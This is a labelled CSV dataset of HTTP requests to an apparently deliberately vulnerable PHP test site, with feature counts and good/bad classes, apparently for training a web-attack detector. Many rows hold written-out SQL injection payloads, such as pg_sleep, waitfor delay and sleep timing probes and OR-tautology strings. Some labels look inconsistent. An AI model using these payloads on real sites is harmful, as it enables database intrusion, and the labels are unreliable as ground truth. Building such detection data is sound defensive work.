method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/hpp/index.php?pp=-1);select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,bad
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=if(now()=sysdate()%2Csleep(3)%2C0)&price=10000,0,0,0,4,0,1,bad
GET,/search.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/BuyProduct-1/.htaccess,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/%F7k.O%0E%DB,,0,0,0,0,0,0,good
GET,/secured/office.htm,,0,0,0,0,0,0,good
GET,/Flash/add.swf,,0,0,0,0,0,0,good
GET,/hpp/params.php?p=oVlRGotp';select%20pg_sleep(6);%20--%20&pp=12,,1,0,1,1,3,2,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/github.com/sebastianbergmann/php-token-stream/,,0,0,0,0,0,0,good
GET,/github.com/symfony/polyfill,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=1&name=1ACUSTART%5C&phpaction=echo%20%24_POST[comment];,0,0,0,0,1,0,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1'%20OR%202%2B422-422-1=0%2B0%2B0%2B1%20--%20&price=15000,1,0,1,0,4,0,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/%7FQ%A4%00%1E%EA%E1s%B3/~7%1B%D9%BB%11%DD,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/vendor/ijaap.nl,,0,0,0,0,0,0,good
GET,"/showimage.php?file=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z",,0,2,0,5,0,1,bad
GET,/hpp/?pp=h73YufFL');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=3&price=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z,2,0,0,5,0,1,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/listproducts.php?cat=-1%20OR%202%2B109-109-1=0%2B0%2B0%2B1%20--%20,,0,0,1,0,4,0,bad
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php?id=2,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/comment.php?pid=-1;select%20pg_sleep(5);%20--%20,,0,0,1,1,3,2,bad
GET,/cart.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1%20OR%202%2B557-557-1=0%2B0%2B0%2B1&price=800,0,0,0,0,2,0,bad
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php?=E1YSV6O0';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/product.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=4&price=-1);select%20pg_sleep(6);%20--%20,0,0,1,1,3,2,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=1%20AND%203*2*1=6%20AND%20173=173,0,0,0,0,4,0,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/artists.php?artist=if(now()=sysdate()%2Csleep(0)%2C0),,0,0,0,4,0,1,bad
GET,/cart.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1'%20OR%202%2B496-496-1=0%2B0%2B0%2B1%20or%20'SJnGYY9P'='&price=15000,4,0,0,0,4,0,bad
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,"0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk",0,2,0,5,2,1,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=1&name=<your%20name%20here>&phpaction=ViDIsHUr'));select%20pg_sleep(9);%20--%20,1,0,1,1,5,2,bad
GET,/product.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/%00%%84%02%B2%A9%B5J%7F%11%B0@%00%10,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
POST,/userinfo.php,pass=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&uname=zFPWdwPk,2,0,0,5,0,1,bad
GET,/product.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=1%20waitfor%20delay%20'0:0:9'%20--%20&text=1,2,0,1,0,6,2,bad
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=1ACUSTART%20ACUEND&price=500,0,0,0,0,1,0,bad
POST,/AJAX/infotitle.php,id=1%20AND%207*7>48%20AND%20173=173,0,0,0,0,4,0,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=4&price=-1""%20OR%202%2B779-779-1=0%2B0%2B0%2B1%20--%20",0,1,1,0,4,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/images/,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=r7qw52OI';select%20pg_sleep(3);%20--%20&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,1,0,1,1,3,2,bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/object-enumerator,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
POST,/userinfo.php,pass=-1'%20OR%202%2B229-229-1=0%2B0%2B0%2B1%20or%20'174OUAXD'='&uname=zFPWdwPk,4,0,0,0,4,0,bad
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php?id=1,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/Details,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
POST,/userinfo.php,pass=-1'%20OR%203*2<(0%2B5%2B939-939)%20--%20&uname=zFPWdwPk,1,0,1,1,4,0,bad
GET,/www.github.com/sebastianbergmann/environment,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/github.com/phpDocumentor/TypeResolver.git,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/index.bak,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=if(now()=sysdate()%2Csleep(3)%2C0)&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];,0,0,0,4,3,1,bad
GET,/redir.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=1ACUSTART%5C&price=15000,0,0,0,0,0,0,good
POST,/userinfo.php,pass=yIkIeura&uname=zFPWdwPk,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,"signup=signup&uaddress=-1""%20OR%202%2B982-982-1=0%2B0%2B0%2B1%20--%20&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk",0,1,1,0,4,0,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=if(now()=sysdate()%2Csleep(4)%2C0)&text=1,0,0,0,4,1,1,bad
POST,/guestbook.php,1ACUSTART%5C&name=anonymous%20user&text=1,0,0,0,0,1,0,bad
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/listproducts.php?artist=-1%20OR%203*2>(0%2B5%2B400-400)%20--%20,,0,0,1,1,4,0,bad
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/secured/office_files/,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/showimage.php?file=-1%20OR%202%2B119-119-1=0%2B0%2B0%2B1&size=160,,0,0,0,0,2,0,bad
POST,/cart.php,addcart=-1'%20OR%203*2>(0%2B5%2B742-742)%20or%20'bPP4MGiW'='&price=10000,4,0,0,1,4,0,bad
GET,/redir.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=6&price=10000,0,0,0,0,0,0,good
GET,/listproducts.php?cat=1*95*90*0,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/diff,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/artists.php?artist=1,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=4&price=-1""%20OR%203%2B779-779-1=0%2B0%2B0%2B1%20--%20",0,1,1,0,4,0,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1%20OR%202%2B40-40-1=0%2B0%2B0%2B1&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,0,0,4,0,bad
GET,/product.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
POST,/userinfo.php,pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2<(0%2B5%2B588-588)%20--%20,1,0,1,1,4,0,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/comment.php,"Submit=Submit&comment=1&name=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&phpaction=echo%20%24_POST[comment];",2,2,0,15,1,9,bad
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/&price=800",2,2,0,15,0,9,bad
GET,/listproducts.php?artist=-1%20OR%203*2=6%20AND%20000462=000462,,0,0,0,0,4,0,bad
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/www.iwink.nl/,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/redir.php?r,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=1ACUSTART%20ACUEND&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,0,0,1,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=1%20AND%205*4=21%20AND%20106=106,0,0,0,0,4,0,bad
GET,/assert,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=1&name=CJ7tF4h9'));select%20pg_sleep(9);%20--%20&phpaction=echo%20%24_POST[comment];,1,0,1,1,4,2,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/AJAX/showxml.php,"<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>",0,4,0,0,2,0,bad
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/listproducts.php?cat=-1%20OR%203*2<(0%2B5%2B586-586)%20--%20,,0,0,1,1,4,0,bad
POST,/cart.php,"addcart=4&price=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z",0,2,0,5,0,1,bad
GET,/hpp/,,0,0,0,0,0,0,good
GET,/api.github.com/repos/sebastianbergmann/phpunit-mock-objects/zipball/a23b761686d50a560cc56233b9ecf49597cc9118,,0,0,0,0,0,0,good
GET,/artists.php?artist=-1%20OR%202%2B696-696-1=0%2B0%2B0%2B1,,0,0,0,0,2,0,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/secured/office_files/filelist.xml,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/.idea/encodings.xml,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/admin/create.sql,,0,0,0,0,0,0,good
POST,/search.php?test=query,1%20waitfor%20delay%20'0:0:6'%20--%20&searchFor=the,2,0,1,0,5,2,bad
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=1%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,7,2,bad
GET,/redir.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/polyfill-mbstring,,0,0,0,0,0,0,good
GET,/vendor/HPMailer/PHPMailer.git,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=4&price=WJod6drZ');select%20pg_sleep(9);%20--%20,1,0,1,1,3,2,bad
GET,/hpp/,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/search.php?test=query,"goButton=go&searchFor=1ACUSTART'""U9nprACUEND",1,1,0,0,0,0,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=-1;select%20pg_sleep(3);%20--%20,0,0,1,1,5,2,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php?id=-1%20OR%202%2B540-540-1=0%2B0%2B0%2B1%20--%20,,0,0,1,0,4,0,bad
POST,/cart.php,addcart=-1);select%20pg_sleep(9);%20--%20&price=800,0,0,1,1,3,2,bad
GET,/cart.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/hpp/params.php?p=valid&pp=GBa4fMHc';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/secured/,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=1ACUSTART'""vo69dACUEND&price=460",1,1,0,0,0,0,bad
GET,/redir.php,,0,0,0,0,0,0,good
GET,/listproducts.php?artist=-1%20OR%202%2B462-462-1=0%2B0%2B0%2B1,,0,0,0,0,2,0,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
POST,/cart.php,addcart=2&price=MfMtwlyw,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=7&price=if(now()=sysdate()%2Csleep(6)%2C0),0,0,0,4,0,1,bad
GET,/cart.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php?id=-1%20OR%202%2B57-57-1=0%2B0%2B0%2B1,,0,0,0,0,2,0,bad
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=1&name=<your%20name%20here>&phpaction=-1'%20OR%202%2B588-588-1=0%2B0%2B0%2B1%20--%20,1,0,1,0,6,0,bad
GET,/cart.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php?id=1ACUSTART%20ACUEND,,0,0,0,0,1,0,bad
GET,/comment.php?aid=-1'%20OR%202%2B528-528-1=0%2B0%2B0%2B1%20or%20'pGzSeiHJ'=',,4,0,0,0,4,0,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=-1);%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,7,2,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=6&price=M2KJjT14';select%20pg_sleep(0);%20--%20,1,0,1,1,3,2,bad
POST,/comment.php,"0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&comment=1&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];",0,2,0,5,3,1,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/admin/,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/hpp/index.php?pp=wXAFk8zJ';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/comment.php,"Submit=Submit&comment=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];",2,2,0,15,3,9,bad
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/hpp/params.php?p=1ACUSTART%5C&pp=12,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=Scs2Gupx'));select%20pg_sleep(9);%20--%20&price=15000,1,0,1,1,3,2,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=if(now()=sysdate()%2Csleep(3)%2C0)&price=1000,0,0,0,4,0,1,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/hpp/params.php?p=valid&pp=12*920*915*0,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/www.smarty.net,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000,,0,0,0,0,0,0,good
GET,/listproducts.php?cat=1*1*1,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=7&price=-1""%20OR%202%2B255-255-1=0%2B0%2B0%2B1%20--%20",0,1,1,0,4,0,bad
GET,/hpp/,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&text=1,2,0,0,5,1,1,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/ocramius.github.io/,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/.htaccess,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=1ACUSTART'""1iGlLACUEND&price=800",1,1,0,0,0,0,bad
GET,/cart.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
